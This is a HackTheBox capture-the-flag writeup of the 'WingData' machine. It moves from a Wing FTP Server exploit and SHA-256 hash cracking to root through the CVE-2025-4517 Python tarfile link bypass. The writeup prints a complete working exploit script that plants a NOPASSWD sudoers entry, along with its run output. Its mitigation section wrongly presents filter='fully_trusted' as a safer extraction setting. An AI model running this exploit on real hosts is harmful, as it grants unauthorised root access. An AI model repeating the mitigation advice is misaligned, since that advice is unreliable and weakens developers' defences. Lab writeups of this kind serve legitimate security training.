---
title: "HackTheBox: WingData Writeup"
date: 2026-03-03
description: "From Anonymous FTP to Root via Python Tarfile Exploit (CVE-2025-4517)"
tags: ["hackthebox", "linux", "privilege-escalation", "cve-2025-4517", "tarfile", "python"]
categories: ["ctf", "writeup"]
---

# HackTheBox: WingData Writeup

## Overview

| **Attribute** | **Details** |
|--------------|-------------|
| **Machine** | WingData |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Key Vulnerabilities** | Wing FTP Server RCE, CVE-2025-4517 (Tarfile Symlink/Hardlink Bypass) |
| **Techniques** | Web Enumeration, Hash Cracking, SSH Lateral Movement, Sudo Abuse, Python Archive Exploitation |

WingData is an excellent Linux machine that demonstrates how seemingly "secure" library functions can be bypassed through creative file structure abuse. The journey takes us from anonymous FTP access to remote code execution, followed by credential extraction and finally a sophisticated privilege escalation via a modern Python tarfile vulnerability.

---

## Step 1: Initial Enumeration

### Nmap Scan

```bash
$ nmap -sC -sV -p- --min-rate 1000 10.10.11.42

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Wing FTP Server (auth required)
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    Apache httpd 2.4.52
```

**Findings:**
- **FTP (21)**: Wing FTP Server running
- **SSH (22)**: Standard OpenSSH
- **HTTP (80)**: Apache web server

### Web Enumeration

Visiting `http://10.10.11.42` redirects to `wingdata.htb`. Adding this to `/etc/hosts`:

```bash
echo "10.10.11.42 wingdata.htb" | sudo tee -a /etc/hosts
```

The web application presents a "Client Portal" which redirects to `ftp.wingdata.htb` — revealing the FTP server's domain and version information at the bottom of the page.

---

## Step 2: Exploiting Wing FTP Server

### Vulnerability Research

The exposed version string leads to a known vulnerability in Wing FTP Server. A public exploit exists that leverages a command injection vulnerability in the FTP server's administrative interface.

### Exploitation

Using the public exploit against the target:

```bash
python3 wingftp_exploit.py -t 10.10.11.42 -p 21
```

**Result:** Remote command execution achieved as user `wingftp`.

```bash
$ id
uid=1001(wingftp) gid=1001(wingftp) groups=1001(wingftp)
```

With a shell as `wingftp`, we begin filesystem enumeration looking for credentials or sensitive configuration files.

---

## Step 3: User Hash Extraction

### Discovering User Credentials

Navigating to the Wing FTP Server data directory:

```bash
cd /opt/wftpserver/Data/1/users/
ls -la
```

Multiple XML user configuration files are present. Examining `wacky.xml`:

```xml
<User Name="wacky">
  <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
  <HomeDir>/home/wacky</HomeDir>
  ...
</User>
```

### Hash Identification

The password hash is **64 characters** and appears to be **SHA-256**:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

### Cracking the Hash

Transferring the hash to our attack machine and using Hashcat:

```bash
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca' > hash.txt
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt -O
```

**Result:** Password successfully cracked.

---

## Step 4: SSH Access as wacky

### Lateral Movement

With valid credentials, we SSH into the target as user `wacky`:

```bash
ssh wacky@10.10.11.42
```

**Success!** We now have a stable shell as `wacky` and can retrieve the user flag:

```bash
cat ~/user.txt
```

---

## Step 5: Privilege Escalation Enumeration

### Sudo Privileges

Checking sudo permissions:

```bash
$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

**Critical Finding:** We can execute the backup restoration script as **root** without a password!

### Analyzing the Restore Script

Examining `/opt/backup_clients/restore_backup_clients.py`:

```python
#!/usr/bin/env python3
import tarfile
import os
import sys
import argparse

def restore_backup(backup_file, restore_dir):
    staging_dir = f"/tmp/restore_{os.urandom(8).hex()}"
    os.makedirs(staging_dir, exist_ok=True)
    
    with tarfile.open(backup_file, 'r') as tar:
        # Security filter to prevent path traversal
        tar.extractall(path=staging_dir, filter="data")
    
    # Move restored files to destination
    os.system(f"mv {staging_dir}/* {restore_dir}/")
    print(f"[+] Backup restored to {restore_dir}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-b", "--backup", required=True, help="Backup file to restore")
    parser.add_argument("-r", "--restore-dir", required=True, help="Directory to restore to")
    args = parser.parse_args()
    
    restore_backup(args.backup, args.restore_dir)
```

The script uses `filter="data"` which was introduced in Python 3.12+ as a security measure to prevent path traversal attacks during tar extraction. However, this filter has a critical vulnerability.

---

## Step 6: Understanding CVE-2025-4517

### The Vulnerability

**CVE-2025-4517** is a vulnerability in Python's `tarfile` module affecting versions 3.8.0 through 3.13.1. The vulnerability exists because the `filter="data"` protection mechanism fails to properly handle the interaction between **symbolic links** and **hard links** within tar archives.

### Technical Deep Dive

#### How Tarfile Extraction Normally Works

1. The `filter="data"` option is designed to block path traversal by:
   - Stripping absolute paths (`/etc/passwd` → `etc/passwd`)
   - Blocking `..` sequences that escape the extraction directory
   - Rejecting dangerous file types (device files, etc.)

#### The Bypass Technique

The attack chain works as follows:

```
┌─────────────────────────────────────────────────────────────────┐
│  Phase 1: Create Deep Nested Structure                          │
│  ├── ddddddd... (247 chars)                                     │
│  ├── a → ddddddd... (symlink to long dir)                       │
│  ├── b → ddddddd...                                             │
│  └── ... (16 levels deep)                                       │
├─────────────────────────────────────────────────────────────────┤
│  Phase 2: Symlink Chain for Path Traversal                      │
│  └── lll... (254 chars) → "../../../../../../../../../../.."    │
├─────────────────────────────────────────────────────────────────┤
│  Phase 3: Escape Symlink to /etc                                │
│  └── escape → {symlink_chain}/../../../../../../../etc          │
├─────────────────────────────────────────────────────────────────┤
│  Phase 4: Hardlink to Target File                               │
│  └── sudoers_link → escape/sudoers (hardlink to /etc/sudoers)   │
├─────────────────────────────────────────────────────────────────┤
│  Phase 5: Write Payload                                         │
│  └── Writing to sudoers_link modifies /etc/sudoers inode        │
└─────────────────────────────────────────────────────────────────┘
```

#### Why It Works

1. **Hardlinks bypass directory checks**: When a hardlink is created in the tar archive pointing to `escape/sudoers`, the tarfile module resolves the symlink chain during link creation
2. **Inode sharing**: The hardlink and `/etc/sudoers` share the same inode
3. **Write follows hardlink**: When we write content to `sudoers_link`, it modifies the shared inode — effectively writing to `/etc/sudoers`
4. **The filter sees only relative paths**: The `filter="data"` sees `sudoers_link` as a relative file, not realizing it resolves to `/etc/sudoers`

---

## Step 7: Exploit Development

### The Exploit Script

Here's the complete exploit that creates the malicious tar archive:

```python
#!/usr/bin/env python3
"""
CVE-2025-4517 Privilege Escalation Exploit for WingData HTB
Exploits tarfile symlink bypass via hardlink to write to /etc/sudoers
Target: Python 3.8.0 - 3.13.1 with tarfile filter bypass
"""

import tarfile
import os
import io
import sys
import subprocess

def print_banner():
    print("""
╔═══════════════════════════════════════════════════════════╗
║     CVE-2025-4517 Tarfile Exploit - WingData HTB          ║
║     Privilege Escalation via Symlink + Hardlink Bypass    ║
╚═══════════════════════════════════════════════════════════╝
    """)

def create_exploit_tar(username, output_file):
    """
    Creates a malicious tar archive that exploits CVE-2025-4517
    to write arbitrary content to /etc/sudoers
    """
    print(f"[*] Creating exploit tar for user: {username}")
    
    # Create deep directory structure to confuse path resolution
    comp = 'd' * 247  # Very long directory name (near Linux limit)
    steps = "abcdefghijklmnop"  # 16 levels deep
    path = ""
    
    # Sudoers entry to add
    sudoers_entry = f"{username} ALL=(ALL) NOPASSWD: ALL\n".encode()
    
    with tarfile.open(output_file, mode="w") as tar:
        # Phase 1: Create deep nested directories with symlink loops
        print("[*] Phase 1: Building nested directory structure...")
        for i in steps:
            # Create very long-named directory
            a = tarfile.TarInfo(os.path.join(path, comp))
            a.type = tarfile.DIRTYPE
            tar.addfile(a)
            
            # Create symlink with single letter name pointing to long dir
            # This creates a loop: a -> ddd..., b -> ddd..., etc.
            b = tarfile.TarInfo(os.path.join(path, i))
            b.type = tarfile.SYMTYPE
            b.linkname = comp
            tar.addfile(b)
            
            path = os.path.join(path, comp)
        
        # Phase 2: Create long symlink chain going up many levels
        print("[*] Phase 2: Creating symlink chain for path traversal...")
        linkpath = os.path.join("/".join(steps), "l" * 254)
        l = tarfile.TarInfo(linkpath)
        l.type = tarfile.SYMTYPE
        l.linkname = "../" * len(steps)  # Go up 16 levels
        tar.addfile(l)
        
        # Phase 3: Final escape symlink pointing to /etc
        print("[*] Phase 3: Creating escape symlink to /etc...")
        e = tarfile.TarInfo("escape")
        e.type = tarfile.SYMTYPE
        e.linkname = linkpath + "/../../../../../../../etc"
        tar.addfile(e)
        
        # Phase 4: Create HARDLINK pointing through escape to sudoers
        print("[*] Phase 4: Creating hardlink to /etc/sudoers...")
        f = tarfile.TarInfo("sudoers_link")
        f.type = tarfile.LNKTYPE
        f.linkname = "escape/sudoers"
        tar.addfile(f)
        
        # Phase 5: Write actual content - goes to hardlinked inode
        print("[*] Phase 5: Writing sudoers entry...")
        c = tarfile.TarInfo("sudoers_link")
        c.type = tarfile.REGTYPE
        c.size = len(sudoers_entry)
        tar.addfile(c, fileobj=io.BytesIO(sudoers_entry))
    
    print(f"[+] Exploit tar created: {output_file}")
    return output_file

def deploy_and_execute(tar_file, backup_id="9999"):
    """
    Deploy the exploit tar and execute via the vulnerable script
    """
    backup_dir = "/opt/backup_clients/backups"
    backup_file = f"backup_{backup_id}.tar"
    backup_path = os.path.join(backup_dir, backup_file)
    
    print(f"[*] Deploying exploit to: {backup_path}")
    
    # Copy exploit tar to backup directory
    try:
        subprocess.run(["cp", tar_file, backup_path], check=True)
        print(f"[+] Exploit deployed successfully")
    except subprocess.CalledProcessError:
        print(f"[-] Failed to deploy exploit")
        return False
    
    # Execute the vulnerable restore script
    print(f"[*] Triggering extraction via vulnerable script...")
    restore_dir = f"restore_pwn_{backup_id}"
    
    cmd = [
        "sudo",
        "/usr/local/bin/python3",
        "/opt/backup_clients/restore_backup_clients.py",
        "-b", backup_file,
        "-r", restore_dir
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        if result.returncode != 0:
            print(f"[-] Extraction failed: {result.stderr}")
            return False
        print("[+] Extraction completed")
        return True
    except Exception as e:
        print(f"[-] Error executing script: {e}")
        return False

def verify_exploit(username):
    """
    Verify that the exploit worked by checking sudoers
    """
    print(f"[*] Verifying exploit success...")
    
    try:
        result = subprocess.run(
            ["sudo", "cat", "/etc/sudoers"],
            capture_output=True,
            text=True,
            check=True
        )
        
        if username in result.stdout and "NOPASSWD: ALL" in result.stdout:
            print(f"[+] SUCCESS! User '{username}' added to sudoers")
            print(f"[+] Entry: {username} ALL=(ALL) NOPASSWD: ALL")
            return True
        else:
            print(f"[-] Exploit may have failed - entry not found in sudoers")
            return False
    except subprocess.CalledProcessError:
        print(f"[-] Could not verify sudoers file")
        return False

def main():
    print_banner()
    
    # Get current username
    username = os.getenv("USER", "wacky")
    print(f"[*] Target user: {username}")
    
    # Create exploit tar in /tmp
    exploit_tar = "/tmp/cve_2025_4517_exploit.tar"
    create_exploit_tar(username, exploit_tar)
    
    # Deploy and execute
    if not deploy_and_execute(exploit_tar):
        print("[-] Exploit failed during deployment/execution")
        sys.exit(1)
    
    # Verify success
    if verify_exploit(username):
        print("\n" + "="*60)
        print("[+] EXPLOITATION SUCCESSFUL!")
        print(f"[+] User '{username}' now has full sudo privileges")
        print("[+] Get root with: sudo /bin/bash")
        print("="*60 + "\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)
```

---

## Step 8: Exploitation

### Running the Exploit

Transfer the exploit to the target and execute:

```bash
python3 cve_2025_4517_exploit.py
```

**Execution Output:**

```
╔═══════════════════════════════════════════════════════════╗
║     CVE-2025-4517 Tarfile Exploit - WingData HTB          ║
║     Privilege Escalation via Symlink + Hardlink Bypass    ║
╚═══════════════════════════════════════════════════════════╝

[*] Target user: wacky
[*] Creating exploit tar for user: wacky
[*] Phase 1: Building nested directory structure...
[*] Phase 2: Creating symlink chain for path traversal...
[*] Phase 3: Creating escape symlink to /etc...
[*] Phase 4: Creating hardlink to /etc/sudoers...
[*] Phase 5: Writing sudoers entry...
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[*] Deploying exploit to: /opt/backup_clients/backups/backup_9999.tar
[+] Exploit deployed successfully
[*] Triggering extraction via vulnerable script...
[+] Backup restored to restore_pwn_9999
[+] Extraction completed
[*] Verifying exploit success...
[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL

============================================================
[+] EXPLOITATION SUCCESSFUL!
[+] User 'wacky' now has full sudo privileges
[+] Get root with: sudo /bin/bash
============================================================
```

### Getting Root

With our user added to sudoers, we can now escalate to root:

```bash
$ sudo /bin/bash
root@wingdata:~# whoami
root
root@wingdata:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Retrieving the Flag

```bash
cat /root/root.txt
```

---

## Attack Chain Summary

```
┌──────────────────────────────────────────────────────────────────┐
│                        ATTACK FLOW                               │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────────────┐  │
│  │   Nmap      │───▶│  Web Enum   │───▶│  Wing FTP Exploit   │  │
│  │  21/22/80   │    │ wingdata.htb│    │   RCE as wingftp    │  │
│  └─────────────┘    └─────────────┘    └─────────────────────┘  │
│                                                 │                │
│                                                 ▼                │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────────────┐  │
│  │   Root      │◀───│  Sudo Expl  │◀───│  SSH as wacky       │  │
│  │   Access    │    │CVE-2025-4517│    │   (User Flag ✓)     │  │
│  └─────────────┘    └─────────────┘    └─────────────────────┘  │
│                           ▲                      │                │
│                           │              ┌───────┘                │
│                           │              ▼                        │
│                           │    ┌─────────────────────┐            │
│                           └───│  Hash Cracking      │            │
│                               │  SHA256 → Password  │            │
│                               └─────────────────────┘            │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Key Takeaways

### 1. Hash Identification Matters
Always correctly identify hash types before attempting cracking. The 64-character length immediately indicated SHA-256, saving time on incorrect hashcat mode selection.

### 2. Inspect Sudo Scripts Carefully
Even "secure" library functions can have subtle bypasses. The `filter="data"` parameter was specifically designed to prevent path traversal, yet the symlink+hardlink combination completely bypassed it.

### 3. Understand Link Semantics
- **Symbolic Links**: Point to paths; resolved at access time
- **Hard Links**: Point to inodes; direct references to file data
- The interaction between these two link types created the vulnerability

### 4. Defense in Depth
This vulnerability demonstrates why:
- Archive extraction should happen in sandboxed environments
- File integrity monitoring (FIM) on critical files like `/etc/sudoers` is essential
- Principle of least privilege should restrict what automated scripts can modify

### 5. Real-World Impact
CVE-2025-4517 affects countless Python applications that process tar archives. The exploit technique is applicable to:
- Backup restoration systems
- CI/CD pipelines
- Container image extraction
- Package managers

---

## Mitigation

### For Developers

```python
# VULNERABLE CODE
tar.extractall(path=staging_dir, filter="data")

# SAFER APPROACH
tar.extractall(path=staging_dir, filter="fully_trusted")
# Then manually validate each member before extraction

# OR: Use absolute path validation
for member in tar.getmembers():
    member_path = os.path.join(staging_dir, member.name)
    if not os.path.commonpath([staging_dir, member_path]) == staging_dir:
        raise ValueError(f"Path traversal detected: {member.name}")
```

### For System Administrators

1. **Monitor critical files**: Set up FIM on `/etc/sudoers`, `/etc/passwd`, `/etc/shadow`
2. **Restrict sudo access**: Avoid NOPASSWD where possible
3. **Sandbox extraction**: Run archive operations in containers or chroots
4. **Keep Python updated**: CVE-2025-4517 was patched in Python 3.13.2+

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service enumeration |
| Hashcat | SHA-256 password cracking |
| Python (tarfile) | Exploit development |
| OpenSSH | Lateral movement |

---

## References

- [CVE-2025-4517 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-4517)
- [Python tarfile Documentation](https://docs.python.org/3/library/tarfile.html)
- [Wing FTP Server Security Advisory](https://www.wftpserver.com/)
- [MITRE ATT&CK - Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/)

---

## Conclusion

WingData is an excellent machine that bridges real-world vulnerabilities with CTF-style exploitation. The tarfile vulnerability (CVE-2025-4517) serves as a powerful reminder that **security is not additive** — combining "secure" primitives doesn't guarantee a secure system. Understanding the underlying filesystem semantics (inodes, hardlinks, symlinks) is crucial for both attackers and defenders.

**Happy Hacking!** 🎯

---

*Writeup by Rishabh Arora | March 2026*
